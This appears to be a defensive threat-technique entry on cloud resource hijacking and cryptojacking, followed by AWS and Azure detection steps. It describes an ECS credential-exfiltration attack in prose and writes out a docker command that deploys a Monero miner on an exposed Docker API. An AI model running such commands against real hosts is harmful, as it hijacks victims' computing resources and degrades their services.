<html>

<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=Generator content="Microsoft Word 15 (filtered)">
<style>
<!--
 /* Font Definitions */
 @font-face
	{font-family:"Cambria Math";
	panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
@font-face
	{font-family:"Segoe UI";
	panose-1:2 11 5 2 4 2 4 2 2 3;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin:0in;
	font-size:12.0pt;
	font-family:"Calibri",sans-serif;}
a:link, span.MsoHyperlink
	{color:blue;
	text-decoration:underline;}
p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
	{margin-top:0in;
	margin-right:0in;
	margin-bottom:0in;
	margin-left:.5in;
	font-size:12.0pt;
	font-family:"Calibri",sans-serif;}
p.MsoListParagraphCxSpFirst, li.MsoListParagraphCxSpFirst, div.MsoListParagraphCxSpFirst
	{margin-top:0in;
	margin-right:0in;
	margin-bottom:0in;
	margin-left:.5in;
	font-size:12.0pt;
	font-family:"Calibri",sans-serif;}
p.MsoListParagraphCxSpMiddle, li.MsoListParagraphCxSpMiddle, div.MsoListParagraphCxSpMiddle
	{margin-top:0in;
	margin-right:0in;
	margin-bottom:0in;
	margin-left:.5in;
	font-size:12.0pt;
	font-family:"Calibri",sans-serif;}
p.MsoListParagraphCxSpLast, li.MsoListParagraphCxSpLast, div.MsoListParagraphCxSpLast
	{margin-top:0in;
	margin-right:0in;
	margin-bottom:0in;
	margin-left:.5in;
	font-size:12.0pt;
	font-family:"Calibri",sans-serif;}
.MsoChpDefault
	{font-size:12.0pt;}
 /* Page Definitions */
 @page WordSection1
	{size:8.5in 11.0in;
	margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
	{page:WordSection1;}
 /* List Definitions */
 ol
	{margin-bottom:0in;}
ul
	{margin-bottom:0in;}
-->
</style>

</head>

<body lang=EN-CA link=blue vlink="#954F72" style='word-wrap:break-word'>

<div class=WordSection1>

<p class=MsoNormal><span lang=EN-US style='font-size:24.0pt;font-family:"Arial",sans-serif'>Resource
Hijacking </span><span lang=EN style='font-family:"Arial",sans-serif;
color:black'>(version 1.0)</span></p>

<p class=MsoNormal><span lang=EN style='font-family:"Arial",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal style='margin-top:6.0pt'><b><span lang=EN-US
style='font-size:14.0pt;font-family:"Arial",sans-serif;color:#404040'>Cloud
Service Label:  IaaS, PaaS</span></b></p>

<p class=MsoNormal style='margin-top:6.0pt'><b><span lang=EN-US
style='font-size:14.0pt;font-family:"Arial",sans-serif'>&nbsp;</span></b></p>

<p class=MsoNormal style='margin-top:6.0pt'><span lang=EN-US style='font-size:
16.0pt;font-family:"Arial",sans-serif'>Description</span></p>

<p class=MsoNormal><span lang=EN-US style='font-family:"Arial",sans-serif'>Adversaries
may leverage the resources of co-opted systems in order to solve resource
intensive problems which may impact system and/or hosted service availability.&nbsp;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-family:"Arial",sans-serif'>One
common purpose for Resource Hijacking is to validate transactions of
cryptocurrency networks and earn virtual currency. Adversaries may consume
enough system resources to negatively impact and/or cause affected machines to
become unresponsive.&nbsp;Servers and cloud-based systems are common targets
because of the potential for nearly unlimited resources, but user endpoint
systems may also be compromised and used for Resource Hijacking and
cryptocurrency mining.</span></p>

<p class=MsoNormal><span lang=EN-US style='font-family:"Arial",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:16.0pt;font-family:"Arial",sans-serif'>Examples</span></p>

<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0
 style='border-collapse:collapse;border:none'>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><b><span lang=EN-US style='font-family:"Arial",sans-serif'>Name</span></b><span
  lang=EN-US style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-left:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><b><span lang=EN-US style='font-family:"Arial",sans-serif'>Description</span></b><span
  lang=EN-US style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
  </td>
 </tr>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt;font-family:"Arial",sans-serif'>Rhino
  Security Labs Blog Post (Pacu Tool)</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border-top:none;border-left:
  none;border-bottom:solid black 1.0pt;border-right:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt;font-family:"Arial",sans-serif;
  color:#404040'>This blog post outlines an attack where an adversary starts
  with a low-level role with access to ECS and then finds a task role that has
  permissions that are elevated to what they need. A task definition is edited
  to be malicious and run a command to pull a shell script from a server being
  hosted by the adversary. A shell script payload to exfiltrate credentials is
  created and then using the AWS CLI is used to run a command that is used to
  run the malicious task definition, this is done using run-task API. The
  adversary can then receive exfiltrated credentials and use them to continue
  attacks.</span></p>
  </td>
 </tr>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt;font-family:"Arial",sans-serif'>Cryptojacking
  Campaign</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border-top:none;border-left:
  none;border-bottom:solid black 1.0pt;border-right:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt;font-family:"Arial",sans-serif'>On
  November 24, 2019, a cryptojacking campaign exploited Docker API endpoints to
  mine Monero. This was done by deploying an Alpine Linux OS container to the
  exposed Docker API that runs a malicious script from the attackers’ servers
  and installs a Monero miner. Launching a mining container is as easy as <i>docker
  -H 192.168.1.7:2376 run --restart unless-stopped --read-only -m 50M -c 512
  bitnn/alpine-xmrig-o POOL01 -o POOL02 -u WALLET -p PASSWORD -k</i></span></p>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt;font-family:"Arial",sans-serif;
  color:black'>&nbsp;</span></p>
  </td>
 </tr>
</table>

<p class=MsoNormal><span lang=EN-US style='font-family:"Arial",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:16.0pt;font-family:"Arial",sans-serif'>Mitigations</span></p>

<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0
 style='border-collapse:collapse;border:none'>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><b><span lang=EN-US style='font-family:"Arial",sans-serif'>Mitigation</span></b></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-left:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><b><span lang=EN-US style='font-family:"Arial",sans-serif'>Description</span></b><span
  lang=EN-US style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
  </td>
 </tr>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal style='line-height:107%'><span lang=EN-US
  style='font-size:9.0pt;line-height:107%;font-family:"Arial",sans-serif'>Limit
  Resource Requests</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border-top:none;border-left:
  none;border-bottom:solid black 1.0pt;border-right:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt;font-family:"Arial",sans-serif;
  color:#404040'>Clouds have quota systems that can be used to limit the damage
  of an adversary requesting large amount of resources in a certain region.</span></p>
  </td>
 </tr>
</table>

<p class=MsoNormal><span lang=EN-US style='font-size:16.0pt;font-family:"Arial",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:16.0pt;font-family:"Arial",sans-serif'>Detection</span></p>

<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0
 style='border-collapse:collapse;border:none'>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><b><span lang=EN-US>Detection</span></b></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-left:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><b><span lang=EN-US>Description</span></b><span
  lang=EN-US>&nbsp;</span></p>
  </td>
 </tr>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>Create Log Metric
  Filters and Alarms for AWS</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border-top:none;border-left:
  none;border-bottom:solid black 1.0pt;border-right:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>To create a
  metric filter and alarm:</span></p>
  <p class=MsoListParagraphCxSpFirst style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Create a metric filter
  that checks for IAM policy changes and the <i>&lt;cloudtrail_log_group_name&gt;</i></span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Create an SNS topic</span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Create an SNS
  subscription to the above topic</span></p>
  <p class=MsoListParagraphCxSpLast style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Create an alarm
  associated with the filter and SNS topic created in steps 1 and 2
  respectively</span></p>
  </td>
 </tr>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>Monitor Activity
  in AWS Account</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border-top:none;border-left:
  none;border-bottom:solid black 1.0pt;border-right:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>Various services
  in AWS offer logging features that allow for detection capabilities. These
  include CloudFront, CloudTrail, CloudWatch, Config, and S3. </span></p>
  </td>
 </tr>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>Monitor for
  Suspicious Activity in Azure</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border-top:none;border-left:
  none;border-bottom:solid black 1.0pt;border-right:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>Azure AD can
  generate anomaly reports than can be run on a daily basis. Azure AD Identity
  Protection show current risks in its dashboard and provides daily email
  summary notifications. Policies can also be configured to alert to specific
  issues.</span></p>
  </td>
 </tr>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>Create Log Metric
  Filters and Alarms for CloudTrail</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border-top:none;border-left:
  none;border-bottom:solid black 1.0pt;border-right:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>To create a
  metric filter and alarm:</span></p>
  <p class=MsoListParagraphCxSpFirst style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Create a filter that
  checks for CloudTrail changes and the specific <i>&lt;cloudtrail_log_group_name&gt;</i></span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Create an SNS topic
  that the alarm will notify</span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Create an SNS
  subscription to the above topic</span></p>
  <p class=MsoListParagraphCxSpLast style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Create an alarm
  associated with the filter from step 1 and SNS topic in step 2</span></p>
  </td>
 </tr>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>Create Activity
  Log Alerts in Azure</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border-top:none;border-left:
  none;border-bottom:solid black 1.0pt;border-right:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>To create log
  activity alerts for deletion in the Azure Console:</span></p>
  <p class=MsoListParagraphCxSpFirst style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Navigate to <i>Monitor’
  / ‘Alerts</i></span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Select <i>Manage alert
  rules</i></span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Click on the Alert <i>Name</i>
  where Condition contains <i>operationName equals
  Microsoft.Network/networkSecurityGroups/securityRules/delete</i></span></p>
  <p class=MsoListParagraphCxSpLast style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Hover a mouse over <i>Condition</i>
  to ensure it is set to <i>Whenever the Administrative Activity Log “Delete
  Security Rule (networkSecurityGroups/securityRules)” has “any” level with
  “any” status and event is initiated by “any</i>”</span></p>
  </td>
 </tr>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>Create, View, and
  Manage Activity Alerts in Azure Monitor</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border-top:none;border-left:
  none;border-bottom:solid black 1.0pt;border-right:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>To create a log
  alert in the Azure portal:</span></p>
  <p class=MsoListParagraphCxSpFirst style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Select <b>Monitor
  -&gt; Alerts</b></span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Select <b>New alert
  rule</b> of the <b>Alerts</b> window</span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Provide information in
  <b>Define alert condition</b></span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Provide details in <b>Define
  alert details</b></span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>5.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Specify action group
  for new alert rule under <b>Action group</b>, or create a new action group
  with + <b>New group</b></span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>6.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Select <b>Yes</b> for
  the <b>Enable rule upon creation</b> option</span></p>
  <p class=MsoListParagraphCxSpLast style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>7.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Select <b>Create alert
  rule</b></span></p>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>&nbsp;</span></p>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>To view and
  manage alerts:</span></p>
  <p class=MsoListParagraphCxSpFirst style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Select <b>Monitor
  -&gt; Alerts -&gt; Manage alert rules</b></span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Select the rule you
  want to modify and double-click to edit the rule options</span></p>
  <p class=MsoListParagraphCxSpLast style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Click <b>Save</b></span></p>
  </td>
 </tr>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>Azure Resource
  Manager Templates</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border-top:none;border-left:
  none;border-bottom:solid black 1.0pt;border-right:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>Azure Resource
  Manager templates in the format of JSON files that can be used to configure
  metric alerts in Azure Monitor. These templates can be used for simple static
  and dynamic threshold metric alerts, availability tests, and monitoring
  multiple resources.</span></p>
  </td>
 </tr>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>Enable CloudTrail
  across all regions in AWS</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border-top:none;border-left:
  none;border-bottom:solid black 1.0pt;border-right:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>To enable
  CloudTrail across all regions:</span></p>
  <p class=MsoListParagraphCxSpFirst style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Sign into the AWS
  Management Console and open the CloudTrail console</span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Click on <i>Trails</i>
  </span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Set necessary Trails
  to All option in the I column</span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Click on a trail via
  the link <i>Name</i> column</span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>5.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Set <i>Logging</i> to <i>ON</i></span></p>
  <p class=MsoListParagraphCxSpLast style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>6.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Set <i>Apply trail to all
  regions</i> to <i>Yes</i></span></p>
  </td>
 </tr>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>Configure log
  profile to capture activity logs for all regions in Azure</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border-top:none;border-left:
  none;border-bottom:solid black 1.0pt;border-right:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.0pt'>To set up
  activity logs for all regions:</span></p>
  <p class=MsoListParagraphCxSpFirst style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Navigate to Azure
  console</span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Go to <i>Activity log</i></span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Select <i>Export</i></span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Select <i>Subscription</i></span></p>
  <p class=MsoListParagraphCxSpMiddle style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>5.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Check <i>Select all</i>
  in <i>Regions</i></span></p>
  <p class=MsoListParagraphCxSpLast style='margin-bottom:8.0pt;text-indent:
  -.25in'><span lang=EN-US style='font-size:9.0pt'>6.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span><span lang=EN-US style='font-size:9.0pt'>Select <i>Save</i></span></p>
  </td>
 </tr>
 <tr>
  <td width=312 valign=top style='width:3.25in;border:solid black 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal style='line-height:107%'><span lang=EN-US
  style='font-size:9.0pt;line-height:107%;font-family:"Arial",sans-serif'>Monitoring
  for Regional Activity</span></p>
  </td>
  <td width=312 valign=top style='width:3.25in;border-top:none;border-left:
  none;border-bottom:solid black 1.0pt;border-right:solid black 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal style='line-height:107%'><span lang=EN-US
  style='font-size:9.0pt;line-height:107%;font-family:"Arial",sans-serif'>Tools
  like Splunk or even CloudSploit have the ability to alert based on region and
  ingest CloudTrail logs. In CloudSploit, a plugin called EC2 Max Count can be
  configured to alert after a certain threshold of EC2 instances is met.
  Real-Time Events service is another feature of CloudSploit that allows alerts
  for activity in unused regions.</span></p>
  </td>
 </tr>
</table>

<p class=MsoNormal><span lang=EN-US style='font-family:"Arial",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-family:"Arial",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-family:"Arial",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal><span lang=EN-US style='font-family:"Arial",sans-serif'>&nbsp;</span></p>

<p class=MsoNormal><a name=scite-1></a><a name=scite-2></a><a name=scite-3></a><span
lang=EN-US style='font-size:16.0pt;font-family:"Arial",sans-serif'>References</span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:16.0pt;font-family:"Arial",sans-serif'>&nbsp;</span></p>

<p class=MsoListParagraph style='text-indent:-.25in'><span lang=EN-US
style='font-family:"Arial",sans-serif'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><span lang=EN-US><a
href="https://medium.com/@riccardo.ancarani94/attacking-docker-exposed-api-3e01ffc3c124"><span
style='font-family:"Arial",sans-serif'>https://medium.com/@riccardo.ancarani94/attacking-docker-exposed-api-3e01ffc3c124</span></a></span><span
lang=EN-US style='font-family:"Arial",sans-serif'>. Accessed July 14, 2020.</span></p>

<p class=MsoNormal><span lang=EN-US style='font-family:"Arial",sans-serif'>&nbsp;</span></p>

</div>

</body>

</html>
